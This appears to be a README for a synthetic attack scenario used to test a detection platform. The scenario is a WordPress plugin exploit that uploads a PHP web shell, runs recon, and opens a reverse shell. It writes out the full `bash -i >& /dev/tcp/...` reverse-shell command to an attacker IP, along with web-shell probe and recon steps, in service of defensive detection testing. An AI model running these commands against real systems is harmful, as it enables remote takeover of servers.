# 05_Linux_Web_Attack — WordPress Web Shell → Reverse Shell

## Scenario Overview

Attacker exploits a vulnerable WordPress File Manager plugin on a Linux web server
(`WEBSERVER-01`) to upload a PHP web shell. After initial recon via the shell, the
attacker escalates to a full interactive reverse bash shell back to their listener.
No Windows authentication events — pure Linux/Apache/auditd telemetry.

## Environment

| Host | Role |
|---|---|
| WEBSERVER-01 | Ubuntu Linux, Apache 2.4.54, WordPress corp intranet |
| 194.165.16.15 | Attacker IP (external) |

## Attack Timeline (2024-11-25)

- 14:28 — HTTP POST to vulnerable plugin endpoint (`/upload.php`) — web shell uploaded (`system_health.php`)
- 14:28 — HTTP GET `?cmd=id` — web shell confirmed (uid=33 www-data)
- 14:28 — Linux auditd EXECVE: apache2 spawns `/bin/sh` via PHP `system()` call
- 14:29 — Attacker runs recon via web shell: `/etc/passwd`, `uname -a`, `ps aux`, `netstat -an`
- 14:29 — Reverse bash shell launched: `bash -i >& /dev/tcp/194.165.16.15/4444 0>&1`
- 14:30 — Outbound TCP CONNECT from WEBSERVER-01 to attacker port 4444

## Format

Single JSONL file: `scenario_linux_webshell.jsonl`  
Sources: Apache access log, Linux auditd (EXECVE/CONNECT syscalls)

## Expected Detections

**MITRE coverage:** T1190 (Exploit Public-Facing Application) → T1059.004 (Unix Shell) →
T1071.001 (Web Protocols C2) → T1046 (Network Service Discovery)

**Behavioral rules expected:** `webshell_exec`, `off_hours_privilege`, `lateral_velocity`

**Note:** This is the only Linux scenario in the sample set. Import it to verify the
platform handles non-Windows event formats (no EID fields; uses Apache access log and
auditd EXECVE/CONNECT records). Severity will be HIGH due to confirmed RCE.
